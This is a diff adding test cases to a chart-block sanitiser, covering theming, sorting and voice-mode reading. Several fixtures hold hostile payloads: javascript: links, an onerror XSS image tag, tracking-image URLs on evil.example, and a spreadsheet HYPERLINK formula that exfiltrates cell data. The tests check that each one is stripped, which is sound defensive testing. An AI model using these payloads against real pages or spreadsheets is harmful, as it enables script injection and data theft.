@@ -41,7 +41,7 @@ describe("chart blocks", () => {
     expect(res.ok).toBe(true);
     if (!res.ok) return;
     const o = res.option as Record<string, any>;
-    expect(o.tooltip).toEqual({ extraCssText: "x" });
+    expect(o.tooltip).toEqual({ extraCssText: "x", renderMode: "richText" });
     expect(o.graphic).toHaveLength(1);
     expect(o.series[0].symbol).toBeUndefined();
     expect(o.series[0].label.formatter).toBe("{b}: {c}");
@@ -180,5 +180,85 @@ describe("voice mode reads wealthy text as its spoken lines", () => {
     const segs = splitFences(md);
     expect(segs).toHaveLength(1);
     expect(richSpeakable(md)).toBe(md);
+  });
+});
+
+describe("review fixes", () => {
+  const opt = (o: unknown) => {
+    const res = parseChartBlock(JSON.stringify(o));
+    if (!res.ok) throw new Error(res.error);
+    return res.option as Record<string, any>;
+  };
+
+  it("closes every route from chart text into the page or out to the network", () => {
+    const o = opt({
+      title: { text: "Click", link: "javascript:alert(1)", target: "self", sublink: "https://x", subtarget: "blank" },
+      graphic: [{ type: "text", style: { text: "hover" }, tooltip: { content: "<img src=x onerror=alert(1)>" } }],
+      toolbox: { feature: { dataView: { lang: ["<img src=x onerror=alert(1)>"] } } },
+      backgroundColor: { image: "https://evil.example/px.png", repeat: "repeat" },
+      series: [{ type: "sunburst", data: [{ name: "a", value: 1, link: "javascript:x" }], itemStyle: { color: { image: "https://evil.example/a.png" } }, label: { rich: { a: { backgroundColor: { image: "https://evil.example/b.png" } } } } }],
+    });
+    expect(o.title).toEqual({ text: "Click" });
+    expect(o.toolbox).toBeUndefined();
+    expect(o.graphic[0].tooltip).toEqual({ renderMode: "richText" });
+    expect(o.backgroundColor).toEqual({ repeat: "repeat" });
+    expect(o.series[0].data[0].link).toBeUndefined();
+    expect(JSON.stringify(o)).not.toMatch(/evil|javascript|onerror/);
+  });
+
+  it("forces canvas tooltips, even when the agent asks for HTML ones", () => {
+    const o = opt({ tooltip: { renderMode: "html", trigger: "item" }, series: [{ type: "pie", data: [1], tooltip: { show: true } }] });
+    expect(o.tooltip.renderMode).toBe("richText");
+    expect(o.series[0].tooltip.renderMode).toBe("richText");
+    const d = withDefaults(opt({ series: [{ type: "pie", data: [1] }] })) as Record<string, any>;
+    expect(d.tooltip.renderMode).toBe("richText");
+  });
+
+  it("keeps ordinary labels that merely look like schemes", () => {
+    const o = opt({ series: [{ type: "bar", data: [{ name: "JavaScript", value: 3 }, { name: "data: raw", value: 1 }] }] });
+    expect(o.series[0].data.map((d: any) => d.name)).toEqual(["JavaScript", "data: raw"]);
+  });
+
+  it("puts the dark theme after a diagram's title header", () => {
+    const src = "---\ntitle: Deploy\n---\nflowchart LR\n A-->B";
+    const out = themedSource("mermaid", src);
+    expect(out.startsWith("---\ntitle: Deploy\n---\n%%{init:")).toBe(true);
+    expect(themedSource("mermaid", "---\nconfig:\n  theme: forest\n---\ngraph TD")).toBe("---\nconfig:\n  theme: forest\n---\ngraph TD");
+  });
+
+  it("themes the graph body, not a brace inside its name or a comment", () => {
+    const out = themedSource("graphviz", '// {not this}\ndigraph "a{b" { x -> y }');
+    expect(out).toContain('digraph "a{b" { graph [bgcolor="transparent"');
+    expect(out).toContain("// {not this}");
+  });
+
+  it("sorts mixed size units and skips placeholders", () => {
+    expect(sortOrder([["2 GB"], ["500 MB"], ["1.5 TB"]], 0, "asc")).toEqual([1, 0, 2]);
+    expect(sortOrder([["999"], ["—"], ["1,204"], ["n/a"], ["5"]], 0, "asc")).toEqual([4, 0, 2, 1, 3]);
+    // Units that can't be compared sort as text (still number-aware).
+    expect(sortOrder([["10 s"], ["5 kg"], ["abc"]], 0, "asc")).toEqual([1, 0, 2]);
+  });
+
+  it("never hands a spreadsheet a formula", () => {
+    const rows = [['=HYPERLINK("https://evil?d="&A2,"x")', "-5", "+1 more", "@sum", "plain"]];
+    const csv = toCsv(["a", "b", "c", "d", "e"], rows).split("\r\n")[1];
+    expect(csv).toBe(`"'=HYPERLINK(""https://evil?d=""&A2,""x"")",-5,'+1 more,'@sum,plain`);
+    expect(toTsv(["a"], [["=1+1"]]).split("\n")[1]).toBe("'=1+1");
+  });
+
+  it("voice mode keeps a closed section silent even with code blocks inside", () => {
+    const md = "Done.\n\n<details>\n<summary>Full log</summary>\n\nhidden prose\n\n```log\nline\n```\n\nmore hidden\n\n```chart\n{\"title\":{\"text\":\"Secret\"},\"series\":[{\"type\":\"pie\",\"data\":[1]}]}\n```\n\n</details>\n\nAfter.";
+    const out = richSpeakable(md);
+    expect(out).toContain("Full log.");
+    expect(out).toContain("After.");
+    expect(out).not.toMatch(/hidden|line|Secret/);
+  });
+
+  it("voice mode reads nested open sections inside an open one, and not inside a closed one", () => {
+    const open = richSpeakable("<details open>\n<summary>A</summary>\n\nx1\n\n<details>\n<summary>B</summary>\n\nx2\n\n</details>\n\n</details>");
+    expect(open).toContain("A.");
+    expect(open).toContain("x1");
+    expect(open).toContain("B.");
+    expect(open).not.toContain("x2");
   });
 });
